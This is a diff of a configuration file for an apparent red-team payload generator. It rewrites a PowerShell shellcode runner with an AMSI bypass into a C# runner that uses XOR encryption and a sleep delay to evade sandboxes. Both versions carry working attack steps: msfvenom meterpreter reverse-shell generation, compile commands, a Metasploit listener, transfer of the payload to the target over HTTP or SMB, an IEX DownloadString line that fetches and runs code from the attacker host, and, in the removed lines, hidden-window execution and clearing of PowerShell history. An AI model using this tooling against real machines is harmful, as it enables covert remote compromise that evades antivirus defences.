@@ -1,17 +1,17 @@
 meta:
-  name: "PowerShell Simple Shellcode Runner"
+  name: "Simple XOR Shellcode Runner (C#)"
   category: "Shellcode Execution"
   description: |
-    Simple shellcode runner in PowerShell with AMSI bypass and reflection-based API loading.
+    Simple shellcode runner in C# with XOR encryption and sandbox evasion.
     
     Features:
-    - AMSI bypass to evade AV/EDR script scanning
-    - Dynamic API resolution via reflection (no P/Invoke signatures)
+    - XOR encryption for basic obfuscation (key: 0xfa)
+    - Sleep-based sandbox detection (10 second delay)
     - Direct shellcode execution via VirtualAlloc + CreateThread
-    - Fileless execution capability
+    - Minimal API footprint
     
-    This runner is useful when PowerShell is available but compiled executables
-    are restricted. Uses reflection to avoid static API signatures.
+    This is a straightforward runner suitable for initial access or testing.
+    The sleep-based evasion helps bypass automated sandboxes that skip delays.
     
     WARNING: For authorized security testing only!
 
@@ -19,14 +19,13 @@ meta:
 
   mitre:
     tactic: "TA0002 - Execution"
-    technique: "T1059.001 - PowerShell"
+    technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
 
   artifacts:
-    - "PowerShell execution with suspicious scripts"
-    - "AMSI bypass patterns"
-    - "Reflection-based API resolution"
     - "VirtualAlloc with PAGE_EXECUTE_READWRITE"
     - "CreateThread API calls"
+    - "10-second sleep before execution"
+    - "XOR-decoded shellcode in memory"
     - "Network connection to C2 server"
 
 parameters:
@@ -41,11 +40,17 @@ parameters:
     required: true
     default: 443
 
+  - name: "xor_key"
+    type: "hex"
+    description: "XOR encryption key (single byte, e.g., 'fa')"
+    required: false
+    default: fa
+
   - name: "output_file"
     type: "string"
-    description: "Output PowerShell script filename"
+    description: "Output executable filename"
     required: false
-    default: "runner.ps1"
+    default: "runner.exe"
 
   - name: "output_path"
     type: "path"
@@ -60,23 +65,33 @@ preprocessing:
     command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
     output_var: "raw_shellcode"
 
-  # Step 2: Format shellcode as PowerShell byte array
+  # Step 2: XOR encrypt the shellcode
   - type: "script"
-    name: "format_payload"
-    script: "format_powershell.py"
+    name: "xor_encryption"
+    script: "xor_encrypt.py"
     args:
       data: "{{ raw_shellcode }}"
+      key: "{{ xor_key }}"
+    output_var: "xor_result"
+
+  # Step 3: Format encrypted shellcode as C# byte array
+  - type: "script"
+    name: "format_payload"
+    script: "format_csharp.py"
+    args:
+      data: "{{ xor_result.encrypted }}"
       var_name: "buf"
       bytes_per_line: 15
-    output_var: "powershell_payload"
+    output_var: "csharp_payload"
 
 output:
   type: "template"
-  template: "shellcode_runner/simple_runner.ps1"
+  template: "shellcode_runner/simple_runner.cs"
   compile:
-    enabled: false
+    enabled: true
+    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
   launch_instructions: |
-    PowerShell Simple Shellcode Runner - Launch Instructions
+    C# Simple XOR Shellcode Runner - Launch Instructions
 
     Step 1: Start Metasploit Listener
 
@@ -93,9 +108,9 @@ output:
     set ExitOnSession false
     exploit -j
 
-    Step 2: Transfer Script to Target
+    Step 2: Transfer Payload to Target
 
-    Transfer the generated PowerShell script to the target Windows system:
+    Transfer the generated executable to the target Windows system:
 
     Using Python HTTP server:
     python3 -m http.server 8080
@@ -103,16 +118,17 @@ output:
     On target (PowerShell):
     Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
 
+    Or using SMB:
+    impacket-smbserver share . -smb2support
+    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
+
     Step 3: Execute on Target
 
-    Run with execution policy bypass:
-    powershell.exe -ExecutionPolicy Bypass -File {{ output_file }}
+    Simply run the executable:
+    {{ output_file }}
 
-    Or use dot-sourcing:
-    powershell.exe -ExecutionPolicy Bypass -Command ". .\{{ output_file }}"
-
-    Fileless execution (no file drop):
-    powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/{{ output_file }}')"
+    Or via PowerShell:
+    Start-Process {{ output_file }}
 
     Step 4: Verify Connection
 
@@ -122,33 +138,25 @@ output:
 
     Notes:
 
-    - Includes AMSI bypass to evade script scanning
-    - Uses reflection for dynamic API resolution
-    - No static P/Invoke signatures (helps evade some AV)
+    - Encrypted with XOR key 0x{{ xor_key }} for basic AV evasion
+    - Includes 10-second sleep for sandbox evasion
+    - Uses VirtualAlloc with RWX permissions
+    - Executes shellcode in separate thread
     - EXITFUNC=thread ensures clean exit
-    - PowerShell execution may be logged by Windows Event Logs
 
     Troubleshooting:
 
-    - If AMSI blocks: The bypass may be detected, consider obfuscation
     - If no connection: Check firewall rules on attacker machine
-    - If script blocked: Try encoding or obfuscation techniques
+    - If AV blocks: Consider additional obfuscation or packing
+    - Payload waits 10 seconds before execution (sandbox evasion)
     - Requires x64 Windows system
-    - May need to disable real-time protection for testing
 
-    Alternative Execution Methods:
+    Alternative Execution:
 
-    Encoded command (helps bypass simple AV):
-    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content {{ output_file }} -Raw)))
-    powershell.exe -EncodedCommand $encoded
-
-    Hidden window:
-    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File {{ output_file }}
+    Run from memory (no file drop):
+    powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/loader.ps1')"
 
     Cleanup:
 
-    After testing, remove the script:
+    After testing, remove the payload:
     Remove-Item {{ output_file }} -Force
-
-    Clear PowerShell history:
-    Remove-Item (Get-PSReadlineOption).HistorySavePath
